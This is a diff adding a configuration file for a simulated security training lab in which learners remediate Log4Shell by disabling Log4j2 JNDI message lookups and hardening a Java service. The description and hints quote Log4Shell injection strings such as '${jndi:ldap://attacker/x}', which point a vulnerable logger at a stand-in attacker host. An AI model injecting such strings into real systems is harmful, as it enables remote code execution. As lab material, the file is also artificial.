@@ -1,0 +1,32 @@
+---
+slug: security-java-log4shell-jndi-lookup
+title: "Log4Shell (CVE-2021-44228) — Disable JNDI Message Lookups"
+technology: Security
+category: "Application Security"
+difficulty: hard
+time_limit: 1200
+max_score: 100
+lab_mode: simulation
+simulation_type: generic
+infrastructure_type: simulation
+jira_priority: Critical
+is_free: false
+description: |
+  A Java service bundles a vulnerable Log4j2 version and JNDI message lookups are enabled, so an attacker who gets a string like ${jndi:ldap://attacker/x} into any logged field can achieve remote code execution (Log4Shell). The lookup substitution must be turned off and the runtime hardened so logged user input can no longer trigger a JNDI fetch.
+objectives:
+  - "Confirm Log4j2 JNDI message lookups are enabled (vulnerable)"
+  - "Disable lookup substitution via log4j2.formatMsgNoLookups=true"
+  - "Ensure the hardening is loaded by the runtime (component properties on the classpath)"
+  - "Verify a ${jndi:...} payload in a log message no longer triggers a lookup"
+initial_state: |
+  A Spring Boot app logs request headers with a vulnerable Log4j2. /app/src/main/resources/log4j2.component.properties does not disable message lookups, so ${jndi:ldap://...} in a header is interpreted.
+hints:
+  - order: 1
+    cost: 10
+    content: "Reproduce: log a header containing ${jndi:ldap://test/a} and watch Log4j attempt the lookup."
+  - order: 2
+    cost: 15
+    content: "Set log4j2.formatMsgNoLookups=true (or -Dlog4j2.formatMsgNoLookups=true) to stop substitution."
+  - order: 3
+    cost: 20
+    content: "Best fix is upgrading Log4j2 to a patched release; also remove the JndiLookup class and re-test."
